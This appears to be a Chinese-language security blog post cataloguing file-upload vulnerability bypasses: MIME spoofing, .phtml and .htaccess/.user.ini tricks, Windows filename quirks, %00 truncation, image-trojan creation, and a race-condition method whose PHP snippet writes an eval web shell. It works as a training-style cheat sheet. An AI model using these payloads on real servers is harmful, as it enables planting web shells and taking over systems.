---
layout: post
title:  文件上传漏洞
date:   2022-06-02 00:08:01 +0300
image:  2022-06-02-dessert.jpg
tags:   [web]
---

## 前端JS绕过

禁用JS

修改后缀名绕过验证

### MIME类型绕过

修改【Content-Type】的【application/】为【image/png】【image/jpeg】【image/gif】等合法图片类型

### 黑名单绕过

提示不允许.asp、aspx、php、jsp后缀文件上传

修改【.php】后缀为【.phtml】，根据解析规则【.phtml】会按照【.php】进行解析，上传成功。

### 特殊文件绕过

包含了大量后缀名的数组，然后对上传的文件名进行操作：删除末尾的点、转换为小写、去除字符串、首尾去空，得到最终的文件后缀变量

新建【.htaccess】代码如下，将【.png】为后缀的文件按照【php】格式进行解析

```assembly
AddType application/x-httpd-php .png
```

【.htaccess可以覆盖apache的配置文件，而【.user.ini】则可以覆盖php.ini的配置】

这里有几点需要注意一下

.htaccess文件只能用于apache，不能用于iis和nginx等中间件

.user.ini只能用于Server API为FastCGI模式下，而正常情况下apache不是运行在此模块下的

.htaccess和.user.ini都只能用于访问本目录下的文件时进行覆盖

.user.ini

```assembly
auto_prepend_file=a.gif
```

### 大小写绕过

PHp

### windows解析特性绕过

没有trim()函数来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，则改后缀名不包含在黑名单中，就可以成功进行绕过并上传，同时由于windows操作系统的原因，末尾的空格会在服务端被删除，不影响文件执行。

在文件后缀名后面添加一个空格

windows特性，会自动去掉后缀名末尾的【.】

php在windows条件下，出现文件名+【::$DATA】的格式，则会把【::$DATA】之后的数据当成文件流处理，不会检测后缀名

### 双写绕过

xx.pphphp

### %00截断绕过

magic_quotes_gpc=off、php版本要小于5.3.4

源代码设置了白名单"jpg"，"png"，"gif"，除了白名单之外的所有后缀名都不能进行上传。首先提取了文件的后缀名，然后进行移动文件，但是移动文件的路径是由GET方式得到，所以参数可控，通过添加【%00】来进行截断，可以直接将想要上传的文件拼接到save_path变量中。

save_path="../upload/acsashell.php%00"

### 图片木马绕过

```assembly
copy 11.png/b + acsashell.php/a shell2.png
```

其中/b代表二进制文件，/a表示一个ASCII文本文件

### 二次渲染

二次渲染是指服务器把上传的图片内容提取并重新组合，可以把重新生成的图片和原图片马进行对比，分析新图片和原始文件的差异，进而在渲染过程中未改动的区域内构建恶意代码，从而重新生成图片马。

先上传【a.gif】，随后下载保存为【b.gif】，打开Winhex，点击工具——文件工具——比较

在没有被渲染的区域任意地方加入php代码，保存并上传

### 条件竞争

在进行文件上传时，服务器先进行【move_uploaded_file】文件上传操作后，后判断上传的文件是否合法，如果不合法则删除该文件，但是在多线程情况下，不断上传并访问该文件，就有可能出现尚未删除文件就访问成功的情况，该文件可以被暂时保留下来，因为某个文件真正进行读写操作时，是不能删除该文件的。如果该文件被执行时，能在服务器上生成一个恶意shell的php文件，那么该文件的任务就已全部完成，至于后面关闭文件并被系统删除都已经不重要了，因为攻击者已经成功的在服务器中填入了一个shell文件，后续的攻击围绕shell文件展开就行了。

```assembly
<?php fputs(fopen("2.php","w"),"<?php @eval($_REQUEST[a]);?>");?>
```

【Intruder】-【没有负载】-【无限期重复】

在无限次上传【1.php】中无限次访问【1.php】

200码表示成功执行